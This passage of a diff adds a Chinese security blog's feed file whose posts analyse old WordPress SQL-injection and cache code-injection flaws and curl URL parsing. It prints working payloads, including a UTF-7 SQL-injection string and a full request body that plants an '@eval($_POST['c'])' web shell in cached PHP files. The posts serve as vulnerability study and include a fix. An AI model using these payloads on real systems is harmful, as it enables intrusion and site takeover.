+<p><img src="/2017/10/10/Curl类库解析url安全简读/2857452967.png" alt="A2C1B3F6-89E6-4F1C-B161-3856C3BFAF81.png"></p>
+<p>这时候后面加一个<code>?</code>就能把后面的token变为查询参数,不影响文件读取</p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/3384863887.png" alt="BF8EF7FC-B060-43A0-9B4B-88731333F06F.png"></p>
+<p>如果拼接了前半部分目前来说,又想使用file协议是无计可施的.</p>
+<p>但是你想要用其它协议,没问题.curl如果没有读取到传入curl使用的协议,或者遇到不规范的url.会自行对以下协议进行重组.</p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/8006785.png" alt="D2582EA5-08C9-4D82-8145-B32003AFABD9.png"></p>
+<p>就是说假如你想使用一个ftp协议来下载东西,但是ftp协议被禁用了.你根据它的判断规则传入一个url.</p>
+<p>当在内网的ftp服务器域名前缀是<code>ftp.</code>的情况下libcurl还是会根据你传入的url发起一个ftp请求的.</p>
+<p>感觉这题可以出一道题,有一股浓浓的ctf味道.假如说能重组<code>file</code>协议的话,会是一个不得了的大洞呢,可惜了.</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 源码分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> Curl </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Wordpress 2.0.5 - Trackback UTF-7 SQL injection分析]]></title>
+      <url>/2017/10/10/WordPress-4/</url>
+      <content type="html"><![CDATA[<ul>
+<li>影响条件:</li>
+<li>程序:WordPress</li>
+<li>版本: ?-&gt;2.0.5</li>
+<li>严重程度:高危</li>
+</ul>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>由于这些漏洞都是在exploit-db上面扒下来的exp,再通过exp的作用来分析程序漏洞.所以有时候exp写的比较让人难以理解,可以通过wireshark抓包来进行分析.</p>
+<p>这个漏洞expolit-db里的exp名称是<br><code>WordPress 2.0.5 - Trackback UTF-7 - Remote SQL Injection Exploit</code></p>
+<p>由于这个漏洞是注入,可以选择在<strong>wp-includes/wp-db.php</strong>的<strong>print_error()</strong>函数里面下一个断点,OS X里可以使用macGDBp配合MAMP搭建测试环境,很方便.</p>
+<a id="more"></a>
+<p>我在<strong>print_error()</strong>里下了一个断点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_error</span><span class="params">($str = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">xdebug_break();  <span class="comment">//断点在这里</span></div><div class="line"><span class="keyword">global</span> $EZSQL_ERROR;</div><div class="line"><span class="keyword">if</span> (!$str) $str = mysql_error();</div><div class="line">$EZSQL_ERROR[] =</div><div class="line"><span class="keyword">array</span> (<span class="string">'query'</span> =&gt; <span class="keyword">$this</span>-&gt;last_query, <span class="string">'error_str'</span> =&gt; $str);</div><div class="line"></div><div class="line"><span class="comment">// Is error output turned on or not..</span></div><div class="line"><span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;show_errors ) &#123;</div><div class="line"><span class="comment">// If there is an error then take note of it</span></div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;div id='error'&gt;</span></div><div class="line"><span class="string">&lt;p class='wpdberror'&gt;&lt;strong&gt;WordPress database error:&lt;/strong&gt; [$str]&lt;br /&gt;</span></div><div class="line"><span class="string">&lt;code&gt;$this-&gt;last_query&lt;/code&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;/div&gt;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>运行一遍exp<br><img src="/2017/10/10/WordPress-4/2806207461.png" alt="03F08447-8CE2-4ED0-8039-BB9CA8797868.png"></p>
+<p>可以看到wireshark监听loopback已经抓到了以下的几个http数据包</p>
+<p><img src="/2017/10/10/WordPress-4/1207562817.png" alt="FA9877B1-45D0-4BF7-949E-B943F7AC4675.png"></p>
+<p>在No.82 http数据包中看到了明显的payload<br><img src="/2017/10/10/WordPress-4/901122206.png" alt="08E21E8D-45BC-412D-9801-58AC445496C0.png"></p>
+<p>将这个数据包放在burp里面重放,回到macGDBp里面查看截断的情况.</p>
+<p><img src="/2017/10/10/WordPress-4/2356300686.png" alt="B447920E-8011-4A13-83A1-4AB74604614D.png"></p>
+<p>$blog_name是可以传入注入语句的参数.</p>
+<p>可以看到 $blog_name先是被赋值给了$comment_author之后再被打包传入了wp_new_comment()处理<br><img src="/2017/10/10/WordPress-4/4006991493.png" alt="382A7665-8238-441F-818B-703083DEEA9B.png"></p>
+<p>再wp_new_comment()函数中调用了一个函数来检测相对应的帖子之前是否有使用过trackback功能评论过,所以进行了数据库查询</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> ( $wpdb-&gt;get_var($dupe) )</div><div class="line">            <span class="keyword">die</span>( __(<span class="string">'Duplicate comment detected; it looks as though you\'ve already said that!'</span>) );</div></pre></td></tr></table></figure>
+<pre><code>其中$dupe的语句就是
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">                $dupe = <span class="string">"SELECT comment_ID FROM $wpdb-&gt;comments WHERE comment_post_ID = '$comment_post_ID' AND ( comment_author = '$comment_author' "</span>;</div><div class="line">                    <span class="keyword">if</span> ( $comment_author_email )</div><div class="line">                            $dupe .= <span class="string">"OR comment_author_email = '$comment_author_email' "</span>;</div><div class="line">                                $dupe .= <span class="string">") AND comment_content = '$comment_content' LIMIT 1"</span>;</div></pre></td></tr></table></figure>
+
+
+                    我们可以看到没有经过任何处理的$comment_author就这样进入了sql语句中,进行了数据库的查询.
+
+                    为什么用utf-7就可以注入呢？因为`&apos;`号使用了utf-7编码的话,就绕过了编码函数,如果用utf-8编码的`&apos;`号,会被防注入加上`\`
+
+                    ![7C623354-4EF8-46C3-A6CC-5A1422E24B62.png](http://lonelyrain.me/usr/uploads/2016/06/2484722904.png)
+
+                    所以我们的payload只要用utf-7编码`&apos;`符号为`+ACc-`,让mb_convert_encoding()函数再解码为`&apos;`号就可以闭合前面的`&apos;`号进行注入了.
+
+                    所以构造的payload是
+
+                    <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">                                +ACc- AND 1=0) UNION <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> wp_users <span class="keyword">WHERE</span> <span class="keyword">ID</span>=+<span class="keyword">ACc</span><span class="comment">--1+ACc- /*</span></div></pre></td></tr></table></figure>
+
+
+                    看了一看这个文件的其它最后进入数据库的参数,我发现了`url`这个参数也是可以注入的,最后进入的数据库查询的语句是这个
+                    **wp-trackback.php:87行**
+                    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">                                $dupe = $wpdb-&gt;get_results(&quot;SELECT * FROM $wpdb-&gt;comments WHERE comment_post_ID = &apos;$comment_post_ID&apos; AND comment_author_url = &apos;$comment_author_url&apos;&quot;);</div></pre></td></tr></table></figure>
+</code></pre>]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> WordPress </tag>
+            
+            <tag> 代码注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WordPress <= 1.5.1.2 - xmlrpc Interface SQL Injection分析]]></title>
+      <url>/2017/10/10/WordPress-3/</url>
+      <content type="html"><![CDATA[<ul>
+<li>影响条件:</li>
+<li>程序:WordPress</li>
+<li>版本:&lt;= 1.5.1.2</li>
+<li>严重程度:高危</li>
+</ul>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>想要分析这个漏洞首先要了解<code>xmlrpc</code>的相关知识.</p>
+<h3 id="什么是xmlrpc"><a href="#什么是xmlrpc" class="headerlink" title="什么是xmlrpc?"></a>什么是xmlrpc?</h3><p>xml rpc是使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据调用远程的方法。</p>
+<p>用wordpress xmlrpc.php的sayHello函数来演示一个例子</p>
+<p>发送以下的xmlrpc数据包到wordpress的xmlrpc.php路径上,wordpress就会返回返回一个xmlrpc Response</p>
+<a id="more"></a>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /xmlrpc.php HTTP/1.1</div><div class="line">Host: example.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip, deflate, sdch</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div><div class="line">Content-Length: 114</div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>demo.sayHello<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这是上面一个请求返回的数据包</p>
+<p><img src="/2017/10/10/WordPress-3/2788845538.png" alt="E31985B9-FD8A-4813-B32E-5A80ABDA8DB9.png"></p>
+<p>我们可以看见在<code>&lt;string&gt;&lt;/string&gt;</code>标签中返回了一个<code>Hello!</code></p>
+<p>所以想要调用它的过程,只要遵循xmlrpc协议格式,例如以下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;methodCall&gt;</div><div class="line">&lt;methodName&gt;&lt;/methodName&gt;</div><div class="line">&lt;params&gt;</div><div class="line">&lt;param&gt;</div><div class="line">&lt;value&gt;&lt;/value&gt;</div><div class="line">&lt;/param&gt;</div><div class="line">&lt;/params&gt;</div><div class="line">&lt;/methodCall&gt;</div></pre></td></tr></table></figure>
+<p>##漏洞分析正文<br>首先根据exp来定位漏洞点</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=\<span class="string">"1.0\"?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">params</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>1'<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://wordpress1.5.1/?p=1#1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>上面这个xml文件是这个exp最核心的地方,我把原exp中填充payload的地方换成了<code>1&#39;</code></p>
+<p>返回了如下数据,在这里可以看到返回数据库的错误提示信息</p>
+<p><img src="/2017/10/10/WordPress-3/8102779.png" alt="6A97CEB7-6745-48B9-BD52-E90070EC2449.png"></p>
+<p>来看一下整个执行流程</p>
+<p><img src="/2017/10/10/WordPress-3/1573512138.png" alt="8D317E7F-120B-4BC2-94C7-98C5958030AD.png"></p>
+<p><code>#8</code>中实例化了<code>wp_xmlrpc_server()</code>类,<code>wp_xmlrpc_server()</code>类是wordpress对IXR库的扩展,里面定义了wordpress xmlprc的API.</p>
+<p>从<code>#3</code>开始,流程就进入了wordpress所添加的api －&gt;pingback_ping()中.</p>
+<p>参数赋值语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$pagelinkedfrom = $args[0];</div></pre></td></tr></table></figure>
+<p>args[0]哪来的?args是class IXR_Message中parse()函数处理之后返回的.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$data = $HTTP_RAW_POST_DATA;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;message = <span class="keyword">new</span> IXR_Message($data);</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;message-&gt;parse()) &#123;</div><div class="line"><span class="keyword">$this</span>-&gt;error(<span class="number">-32700</span>, <span class="string">'parse error. not well formed'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我把上面的代码段给摘录出来,parse()解析了标签里面的内容.</p>
+<p>解析出来的内容也就是args[0]直接赋值给了pagelinkedfrom没有经过任何处理直接拼接进了sql语句中.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">        $result = $wpdb-&gt;get_results(<span class="string">"SELECT * FROM $wpdb-&gt;comments WHERE comment_post_ID = '$post_ID' AND comment_author_url = '$pagelinkedfrom'"</span>);</div></pre></td></tr></table></figure>
+<pre><code>导致的注入.
+
+如果是导致数据库出错的sql语句可以看见它的内容不在xmlrpc response的标签里面
+
+![A89E1453-DE26-4594-91A5-843C2AA7BF30.png](http://lonelyrain.me/usr/uploads/2016/06/4217694734.png)
+
+因为调用到`this-&gt;query()`的函数中调用到了一个`$this-&gt;print_error();`函数.
+
+这个函数是当发生数据库错误的时候显示上一条查询的sql语句
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">print_error</span><span class="params">($str = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">        <span class="keyword">global</span> $EZSQL_ERROR;</div><div class="line">        <span class="keyword">if</span> (!$str) $str = mysql_error();</div><div class="line">        $EZSQL_ERROR[] =</div><div class="line">        <span class="keyword">array</span> (<span class="string">'query'</span> =&gt; <span class="keyword">$this</span>-&gt;last_query, <span class="string">'error_str'</span> =&gt; $str);</div><div class="line">        </div><div class="line">        <span class="comment">// Is error output turned on or not..</span></div><div class="line">        <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;show_errors ) &#123;</div><div class="line">        <span class="comment">// If there is an error then take note of it</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"&lt;div id='error'&gt;</span></div><div class="line"><span class="string">        &lt;p class='wpdberror'&gt;&lt;strong&gt;WordPress database error:&lt;/strong&gt; [$str]&lt;br /&gt;</span></div><div class="line"><span class="string">        &lt;code&gt;$this-&gt;last_query&lt;/code&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">        &lt;/div&gt;"</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
+
+
+所以说就是报错语句没有在xml里面的原因了
+</code></pre>]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> WordPress </tag>
+            
+            <tag> 代码注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WordPress <= 1.5.1.1-(wp-includes/functions.php:555)注入]]></title>
+      <url>/2017/10/10/WordPress-2/</url>
+      <content type="html"><![CDATA[<h1 id="WordPress-lt-1-5-1-1-SQL注入分析"><a href="#WordPress-lt-1-5-1-1-SQL注入分析" class="headerlink" title="WordPress &lt;= 1.5.1.1 - SQL注入分析"></a>WordPress &lt;= 1.5.1.1 - SQL注入分析</h1><ul>
+<li>影响条件:</li>
+<li>程序:WordPress</li>
+<li>版本:&lt;= 1.5.1.1</li>
+<li>严重程度:高危</li>
+</ul>
+<h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>在Wordpress调用模版时候,其功能之一是在右侧显示当前存档的类型,进行对应类型查询的时候没有使用干净的参数导致注入</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先将断点下在问题点追寻处理流程</p>
+<p>如下:<br><img src="/2017/10/10/WordPress-2/173017871.png" alt="C3110BB5-4E9D-45E1-B40E-3A3E031C4AD2.png"></p>
+<a id="more"></a>
+<p>这是最后参数被污染之后所处的位置</p>
+<p><img src="/2017/10/10/WordPress-2/2264877938.png" alt="546EC9F9-E58D-453F-846F-3BDF73FC1D9E.png"></p>
+<p>为了理解wordpress的漏洞就要研究wordpress的整个处理流程.</p>
+<p>我们可以看到<code>#8</code>中的代码</p>
+<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/* Short and sweet */</div><div class="line">define(&apos;WP_USE_THEMES&apos;, true);</div><div class="line">require(&apos;./wp-blog-header.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>很简单的两行代码</p>
+<p>Short and sweet:grinning:</p>
+<p>包含了<code>wp-blog-header.php</code></p>
+<p><code>wp-blog-header.php</code>主要进行了一些配置文件的初始化,以及对    <code>GET</code>传入的参数进行了构建。</p>
+<p>构建好参数之后经过处理,应用到对应的模板上面.</p>
+<p>构建参数在主要是如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Call query posts to do the work.</span></div><div class="line"></div><div class="line">$posts = &amp;query_posts($query_string);</div></pre></td></tr></table></figure>
+<p>query_posts()函数的函数原型,如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">query_posts</span><span class="params">($query)</span> </span>&#123;</div><div class="line"><span class="keyword">global</span> $wp_query;</div><div class="line"><span class="keyword">return</span> $wp_query-&gt;query($query);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>query_posts申明了一个<code>$wp_query</code>的全局变量,这是很重要的一个全局变量.</p>
+<p>query()函数原型,如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">query</span><span class="params">($query)</span> </span>&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;parse_query($query);</div><div class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get_posts();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>query函数做了对参数的解析赋值,之后return调用了一个<code>get_posts()</code>函数这个函数做了很多拼接并进行数据库查询语句的动作.</p>
+<p>我还发现了,在<code>#4</code>中的<code>load_template()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_template</span><span class="params">($file)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $posts, $post, $wp_did_header, $wp_did_template_redirect, $wp_query,</div><div class="line">            $wp_rewrite, $wpdb;</div><div class="line">            </div><div class="line">                extract($wp_query-&gt;query_vars);</div><div class="line">                </div><div class="line">                    <span class="keyword">require_once</span>($file);</div><div class="line">                    &#125;</div></pre></td></tr></table></figure>
+<pre><code>这里的`extract($wp_query-&gt;query_vars);`貌似是一段废代码,因为`$wp_query-&gt;query_vars`是`NULL`,extract()接受的参数是array.
+
+在`#2`中![9E14F734-4D79-4D7F-A356-9F4FFA32B805.png](http://lonelyrain.me/usr/uploads/2016/06/1158169231.png)
+
+这个函数从`$wp_query`中取出了`cat`参数被污染的值,并且最终传入了`functions.php`中的`get_category()`拼接的语句中执行了注入的语句.
+
+![D651BF01-6F92-4489-9443-F775DBF723C0.png](http://lonelyrain.me/usr/uploads/2016/06/957824432.png)
+</code></pre>]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> WordPress </tag>
+            
+            <tag> 代码注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WordPress <= 2.0.2 - (cache) 代码注入分析]]></title>
+      <url>/2017/10/10/WordPress-Vul-1/</url>
+      <content type="html"><![CDATA[<h1 id="WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit"><a href="#WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit" class="headerlink" title="WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit"></a>WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit</h1><ul>
+<li>影响条件:</li>
+<li>程序:WordPress</li>
+<li>版本:&lt;= 2.0.2</li>
+<li>严重程度:高危</li>
+</ul>
+<h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>这个漏洞问题出在WordPress生成的序列化后的缓存文件中.因为缓存文件的后缀为<code>php</code>,文件的内容可控,并且文件名在一定条件下可预见,所以在一定条件下可以getshell</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下断点在生成问题文件的地方</p>
+<p><strong>程序流程图</strong></p>
+<p><img src="/2017/10/10/WordPress-Vul-1/383653936.png" alt="1.png"></p>
+<p>出问题的是<br>wp-includes/cache.php<br>文件中的save()函数</p>
+<p>save()函数序列化了用户的资料之后再保存到</p>
+<a id="more"></a>
+<p><code>wp-content/cache/userlogins</code>,<code>wp-content/cache/users</code>这两个目录底下,因为序列化后的文件的后缀是<code>.php</code>所以只要想办法插入我们的恶意代码并且让PHP-cgi执行就好了.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$cache_file = $group_dir . md5($id . DB_PASSWORD) . <span class="string">'.php'</span>;</div><div class="line"><span class="comment">// Remove the cache file if the key is not set.</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;cache[$group][$id])) &#123;</div><div class="line"><span class="keyword">if</span> (file_exists($cache_file))</div><div class="line">@ unlink($cache_file);</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>save()函数中生成的缓存文件名方法是<code>md5($id . DB_PASSWORD)</code>.所以我们需要知道$id与DB_PASSWORD.</p>
+<p>$id的其中一个值就是管理员的帐号,一般都有一个帐号叫做<code>admin</code>.所以md5(‘admin’.’数据库密码’)就是包涵恶意代码的文件名.</p>
+<p>因为写入的文件内容由<code>//</code>开头</p>
+<p><img src="/2017/10/10/WordPress-Vul-1/1658973869.png" alt="2.png"></p>
+<p>如果不输入一个换行符的话,会被始终认为其后的内容是注释,所以需要加入回车符号,经过url编码后的回车符号是<code>%0D</code>并且需要在后面再加上<code>//</code>防止后面序列化的字符被程序认为是我们想要执行的代码,所以最终的payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//%0D@eval($_POST[&apos;c&apos;]);%0D//</div></pre></td></tr></table></figure>
+<p>这个漏洞的利用条件是:</p>
+<ol>
+<li>文件夹有写入权限</li>
+<li>cache功能打开</li>
+<li>知道用户的ID与数据库密码(可能为空)</li>
+</ol>
+<p>发送以下完整payload,就可以在<code>wp-content/cache/userlogins</code>或者<code>wp-content/cache/users/</code>中getshell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from=profile&amp;checkuser_id=1&amp;user_login=admin&amp;first_name=123&amp;last_name=&amp;nickname=test&amp;display_name=//%0D @eval($_POST[&apos;c&apos;]);%0D//&amp;email=admin@example.com&amp;url=http%3A%2F%2F&amp;aim=&amp;yim=&amp;jabber=&amp;description=&amp;pass1=&amp;pass2=&amp;rich_editing=true&amp;submit=Update+Profile+%C2%BB</div></pre></td></tr></table></figure>
+<p>修复方案:<br>1.将生成的文件命名为不可执行后缀例如<code>.txt</code></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> WordPress </tag>
+            
+            <tag> 代码注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[从PHP源代码学习PHP--PHP类型]]></title>
+      <url>/2017/10/10/PHP-Type/</url>
+      <content type="html"><![CDATA[<h1 id="PHP类型"><a href="#PHP类型" class="headerlink" title="PHP类型"></a>PHP类型</h1><h2 id="PHP类型基础知识"><a href="#PHP类型基础知识" class="headerlink" title="PHP类型基础知识"></a>PHP类型基础知识</h2><p>PHP是弱类型语言(依照laruence的说法是一种中强类型语言)</p>
+<p>所谓的弱类型就是在申明一个变量的时候，并不需要显式指明它保存的数据的类型,在程序执行的过程中可以根据需求动态的改变变量的类型.</p>
+<p>那PHP是如何实现这个功能的呢?</p>
+<p>首先PHP定义了一个保存变量的结构体(C语言)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> <span class="title">zval</span>;</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;</div><div class="line"><span class="keyword">long</span> lval;                    <span class="comment">/* long value */</span></div><div class="line"><span class="keyword">double</span> dval;                <span class="comment">/* double value */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line"><span class="keyword">char</span> *val;</div><div class="line"><span class="keyword">int</span> len;</div><div class="line">&#125; str;</div><div class="line">HashTable *ht;                <span class="comment">/* hash table value */</span></div><div class="line">zend_object_value obj;</div><div class="line">zend_ast *ast;</div><div class="line">&#125; zvalue_value;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> 